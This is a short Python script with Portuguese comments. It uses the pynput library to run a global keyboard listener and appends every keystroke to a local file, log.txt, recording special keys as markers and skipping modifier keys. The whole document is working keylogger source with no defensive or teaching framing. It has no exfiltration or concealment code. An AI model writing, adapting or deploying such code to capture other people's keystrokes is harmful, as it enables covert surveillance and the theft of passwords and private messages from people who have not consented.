from pynput import keyboard

#1. Teclas para ignorar
ignorar = {
    keyboard.Key.shift,
    keyboard.Key.shift_r, 
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
    }

#2. Chamar a função quando uma tecla for pressionada
def on_press(key):
    try:
        #2.1 - Se for uma tecla normal (letra, número, símbolo)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
            
#3. Exceção de teclas ao serem pressionadas serão substituidas por outros caracteres             
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write("[CLEAR]")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            elif key in ignorar:
                pass
            else:
                f.write(f"[{key} ")

#4. Inicia a captura de teclas
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()